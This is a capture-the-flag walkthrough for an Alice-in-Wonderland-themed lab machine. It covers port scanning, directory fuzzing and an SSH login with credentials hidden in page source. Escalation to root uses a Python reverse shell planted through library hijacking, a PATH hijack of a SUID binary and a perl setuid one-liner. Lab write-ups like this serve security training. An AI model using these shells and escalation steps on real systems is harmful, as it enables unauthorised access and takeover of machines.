## MACHINE IP
```bash
10.201.21.10
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Mon Oct  6 22:40:49 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.21.10
Nmap scan report for 10.201.21.10
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  6 22:41:52 2025 -- 1 IP address (1 host up) scanned in 63.34 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```
## RECON
```bash
# Operating System                        // Found post Initial foothold
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"

# Credentials                               // Found on Enumeration
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
## ENUMERATION
```bash
# Port 80
- Access url - http://10.201.21.10
- Follow the white rabbit
  
# Fuzzing 
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 404 -o fuzz/feroxbuster-common.txt -t 20 -u $url/
404      GET        1l        4w       19c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       11l       24w      217c http://10.201.21.10/main.css
200      GET     5509l    32331w  3689233c http://10.201.21.10/img/white_rabbit_1.jpg
200      GET       10l       44w      402c http://10.201.21.10/
200      GET     4878l    29120w  2825469c http://10.201.21.10/img/alice_door.jpg
200      GET     3539l    31907w  3432296c http://10.201.21.10/img/alice_door.png
200      GET        5l        8w      153c http://10.201.21.10/img/
301      GET        0l        0w        0c http://10.201.21.10/img => img/
301      GET        0l        0w        0c http://10.201.21.10/index.html => ./
301      GET        0l        0w        0c http://10.201.21.10/img/index.html => ./
301      GET        0l        0w        0c http://10.201.21.10/r => r/
301      GET        0l        0w        0c http://10.201.21.10/r/a => a/
301      GET        0l        0w        0c http://10.201.21.10/r/a/b => b/
301      GET        0l        0w        0c http://10.201.21.10/r/a/b/b => b/
301      GET        0l        0w        0c http://10.201.21.10/r/index.html => ./
301      GET        0l        0w        0c http://10.201.21.10/r/a/index.html => ./
301      GET        0l        0w        0c http://10.201.21.10/r/a/b/index.html => ./
[####################] - 2m     23078/23078   0s      found:16      errors:0      
[####################] - 69s     4614/4614    67/s    http://10.201.21.10/ 
[####################] - 68s     4614/4614    68/s    http://10.201.21.10/img/ 
[####################] - 68s     4614/4614    68/s    http://10.201.21.10/r/ 
[####################] - 68s     4614/4614    68/s    http://10.201.21.10/r/a/ 
[####################] - 68s     4614/4614    68/s    http://10.201.21.10/r/a/b/                

- We can understand that the url redirects to folders forming the word rabbit http://10.201.21.10/r/a/b/
- Access http://10.201.21.10/r/a/b/b/i/t - source code
  

<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

# Credentials possible
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
## INITIAL SHELL
```bash
# SSH login using creds
alice:HowDothTheLittleCrocodileImproveHisShiningTail

sudo ssh alice@$ip
Password: HowDothTheLittleCrocodileImproveHisShiningTail
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
alice@wonderland:~$ whoami
alice
```
## PRIVILEGE ESCALATION
```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 

cat /home/alice/walrus_and_the_carpenter.py

- import random
create file random.py with python reverse shell
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.13.80.25",80))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

- Export PATH
export PATH=.:$PATH

- Start listener and execute
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
connect to [10.13.80.25] from (UNKNOWN) [10.201.11.121] 46986
$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
$ whoami
rabbit                                        

- /home/rabbit found -rwsr-sr-x 1 root   root    17K May 25  2020 teaParty
- when /home/rabbit/teaParty executed 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 06 Oct 2025 18:57:24 +0000
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
  
- It executes command date
- create file date with contents
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash

- export path and execute
export PATH=.:$PATH
/home/rabbit/teaParty

alice@wonderland:~$ /tmp/rootbash -p
rootbash-4.4$ id
uid=1001(alice) gid=1001(alice) euid=1003(hatter) egid=1002(rabbit) groups=1002(rabbit),1001(alice)
rootbash-4.4$ whoami
hatter                             

- Found hatter creds /home/hatter
rootbash-4.4$ cat password.txt                                                                                                                                         
WhyIsARavenLikeAWritingDesk?    

- SSH Login as hatter with creds
hatter:WhyIsARavenLikeAWritingDesk?

- Run Linpeas found capabilites on perl 
- Now if we run which perl it shows /usr/bin/perl as perl is now accesible on user hatter
```
## ROOT | ADMINISTRATOR - PWNED
```bash
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id                                                                                          
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# whoami                  
root         
```
